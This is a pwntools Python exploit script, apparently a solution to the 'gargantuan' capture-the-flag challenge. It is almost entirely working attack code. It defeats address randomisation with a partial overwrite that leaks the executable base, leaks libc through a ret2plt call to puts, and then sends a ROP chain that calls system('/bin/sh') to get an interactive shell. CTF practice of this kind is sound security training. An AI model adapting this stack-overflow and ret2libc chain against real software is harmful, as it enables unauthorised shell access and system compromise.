from pwn import *
import time


binary = "src/gargantuan"
elf = context.binary = ELF(binary, checksec=False)
libc = ELF("libc.so.6", checksec=False)

gs = """
break what
continue
"""

if args.REMOTE:
    p = remote("gargantuan.chal.cyberjousting.com", 1337)
elif args.REMOTE2:
    p = remote("localhost", 40004)
elif args.GDB:
    context.terminal = ["tmux", "splitw", "-h"]
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()


### PARTIAL OVERWRITE + LEAK EXE ###
p.recvline()
p.recvline()

# padding
for _ in range(4):
    #print(_)
    p.sendline(b'A'*0xfd)
    time.sleep(0.1)

# partial overwrite
p.send(b'A'*0xff + b'\x00' + b'A'*48 + b'\x0b')

# get leak
gargantuan = int(p.recvline().split(b' ')[-1].strip().decode()[2:],16)
print("gargantuan: ", hex(gargantuan))
exe_base = gargantuan - elf.sym["gargantuan"]
print("exe_base: ", hex(exe_base))

time.sleep(0.5)



### LEAK LIBC THROUGH RET2PLT ###
# padding
for _ in range(4):
    #print(_)
    p.sendline(b'A'*0xfd+b'\x00')
    time.sleep(0.1)

# partial overwrite
payload = b'A'*0xff + b'\x00' + b'0'*52             # padding
payload += p64(exe_base + 0x11e0)                   # pop rdi; ret
payload += p64(exe_base + elf.got["puts"])          # puts@got
payload += p64(exe_base + elf.plt["puts"])          # puts@plt
payload += p64(exe_base + elf.sym["gargantuan"])    # gargantuan for double exploit

p.send(payload)

# get leak
p.recvline()
puts = int.from_bytes(p.recvline().strip(), byteorder='little')
print("puts: ", hex(puts))
libc_base = puts - libc.sym["puts"]
print("libc_base: ", hex(libc_base))



### RET2LIBC ###
# padding
for _ in range(4):
    #print(_)
    p.sendline(b'A'*0xfd+b'\x00')
    time.sleep(0.1)

# partial overwrite
payload = b'A'*0xff + b'\x00' + b'0'*52                     # padding
payload += p64(libc_base + 0x29139)                         # ret for stack alignment
payload += p64(exe_base + 0x11e0)                           # pop rdi; ret
payload += p64(libc_base + next(libc.search(b"/bin/sh")))   # /bin/sh
payload += p64(libc_base + libc.sym["system"])              # system

p.send(payload)


p.interactive()